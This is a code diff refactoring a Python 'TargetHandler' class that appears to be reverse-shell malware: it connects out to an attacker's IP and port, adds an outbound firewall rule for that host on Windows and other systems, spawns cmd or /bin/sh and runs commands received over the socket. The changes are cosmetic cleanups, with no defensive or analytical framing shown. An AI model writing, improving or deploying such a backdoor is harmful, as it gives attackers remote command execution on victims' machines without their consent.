@@ -46,7 +46,7 @@ class TargetHandler:
             print(f"An error occurred during connection: {e}")
             exit()
 
-    def _setup_firewall(self, os_name: str = platform.system()):
+    def _setup_firewall(self, os_name: str):
         """
         Attempts to set up a firewall rule to allow outgoing connections (requires root/admin privileges).
         Note: This might not always be necessary or successful depending on the target's firewall configuration.
@@ -54,8 +54,10 @@ class TargetHandler:
         Args:
             os_name (str, optional): The operating system name ('Windows' or 'Linux' or 'Darwin'). Defaults to platform.system().
         """
+        if not os_name: os_name = platform.system()
         print("Attempting to set up firewall (may require administrator/root privileges)...")
         _p = self.host_port if self.host_port else 4444
+
         match os_name:
             case 'Windows':
                 command = f'netsh advfirewall firewall add rule name="Allow Outbound {_p}" dir=out action=allow protocol=TCP remoteip={self.host_ip} remoteport={_p}'
@@ -166,11 +168,10 @@ class TargetHandler:
         if not self.target:
             print("No active connection for shell.")
             return
-        process = None
+        process: Popen[bytes]
         try:
-            process = Popen[bytes] = subprocess.Popen(['cmd'] if platform.system() == 'Windows' else ['/bin/sh'],
-                                                     stdin=subprocess.PIPE, stdout=subprocess.PIPE,
-                                                     stderr=subprocess.PIPE)
+            process = subprocess.Popen(['cmd'] if platform.system() == 'Windows' else ['/bin/sh'],
+                                       stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             print("Interactive shell started.")
             while True:
                 receive_cmd = self.target.recv(1024).decode()
@@ -216,10 +217,10 @@ class TargetHandler:
         """
         Closes the connection with the attacker.
         """
-        if self.target:
-            print("Closing connection.")
-            self.target.close()
-            self.target = None
+        if not self.target: return
+        print("Closing connection.")
+        self.target.close()
+        self.target = None
 
     def run(self):
         """
@@ -247,6 +248,8 @@ class TargetHandler:
                     break
         finally:
             self.close_connection()
+
+
 Host_ip = ""
 Host_port = 5555
 TargetHandler1 = TargetHandler(Host_ip, Host_port)
